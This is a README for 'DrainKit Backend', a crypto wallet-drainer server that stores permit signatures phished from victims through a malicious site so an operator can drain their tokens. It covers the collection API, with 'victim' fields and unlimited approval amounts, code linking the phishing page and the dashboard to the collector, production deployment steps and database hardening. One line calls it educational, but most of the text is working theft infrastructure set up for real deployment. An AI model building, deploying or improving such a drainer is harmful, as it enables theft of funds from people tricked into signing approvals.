# DrainKit Backend

Minimal backend server for collecting permit signatures from malicious sites.

## Installation

```bash
cd backend
npm install
```

## Usage

```bash
# Development (auto-restart on changes)
npm run dev

# Production
npm start
```

Server runs on `http://localhost:3001`

## API Endpoints

### POST `/api/collect-permit`
Collect permit signature from malicious site.

**Request:**
```json
{
  "chainId": 1,
  "token": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
  "victim": "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb",
  "deadline": 1710158400,
  "v": 27,
  "r": "0x...",
  "s": "0x..."
}
```

**Response:**
```json
{
  "success": true,
  "id": "1-0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb-0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48-1710158400"
}
```

### GET `/api/signatures`
Get all pending signatures (for dashboard).

**Response:**
```json
[
  {
    "id": "1-0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb-0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48-1710158400",
    "chainId": 1,
    "token": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    "victim": "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb",
    "amount": "115792089237316195423570985008687907853269984665640564039457584007913129639935",
    "deadline": 1710158400,
    "v": 27,
    "r": "0x...",
    "s": "0x...",
    "timestamp": 1710154800000,
    "status": "pending"
  }
]
```

### POST `/api/signatures/:id/executed`
Mark signature as executed (after draining).

**Response:**
```json
{
  "success": true
}
```

### DELETE `/api/signatures/:id`
Delete signature.

**Response:**
```json
{
  "success": true
}
```

### GET `/health`
Health check.

**Response:**
```json
{
  "status": "ok",
  "signatures": 5,
  "pending": 3
}
```

## Integration

### Update Malicious Site

In `malicious-site/permit-phishing.html`, change:

```javascript
await fetch('http://localhost:3001/api/collect-permit', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ chainId, token, victim, deadline, v, r, s })
});
```

### Update Dashboard

In `Dashboard/src/components/PermitSignaturesPanel.tsx`, add:

```typescript
useEffect(() => {
  const fetchSignatures = async () => {
    const res = await fetch('http://localhost:3001/api/signatures');
    const data = await res.json();
    setSignatures(data);
  };
  
  fetchSignatures();
  const interval = setInterval(fetchSignatures, 5000); // Poll every 5s
  return () => clearInterval(interval);
}, []);
```

## Production Deployment

### Option 1: VPS (DigitalOcean, AWS, etc.)

```bash
# Install Node.js
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt-get install -y nodejs

# Clone and setup
git clone <your-repo>
cd backend
npm install

# Run with PM2
npm install -g pm2
pm2 start server.js --name drainkit-backend
pm2 save
pm2 startup
```

### Option 2: Vercel/Railway

```bash
# Deploy to Vercel
vercel deploy

# Or Railway
railway up
```

### Option 3: Docker

```dockerfile
FROM node:20-alpine
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
EXPOSE 3001
CMD ["npm", "start"]
```

```bash
docker build -t drainkit-backend .
docker run -p 3001:3001 drainkit-backend
```

## Security Notes

⚠️ **This is a minimal implementation for educational purposes.**

For production:
- Add authentication
- Use database (PostgreSQL, MongoDB)
- Add rate limiting
- Use HTTPS
- Add logging
- Add monitoring
- Validate all inputs
- Add error handling

## Storage

Currently uses in-memory storage. For production, use a database:

```javascript
// Example with PostgreSQL
import pg from 'pg';
const pool = new pg.Pool({ connectionString: process.env.DATABASE_URL });

app.post('/api/collect-permit', async (req, res) => {
  const { chainId, token, victim, deadline, v, r, s } = req.body;
  
  await pool.query(
    'INSERT INTO signatures (chain_id, token, victim, deadline, v, r, s) VALUES ($1, $2, $3, $4, $5, $6, $7)',
    [chainId, token, victim, deadline, v, r, s]
  );
  
  res.json({ success: true });
});
```
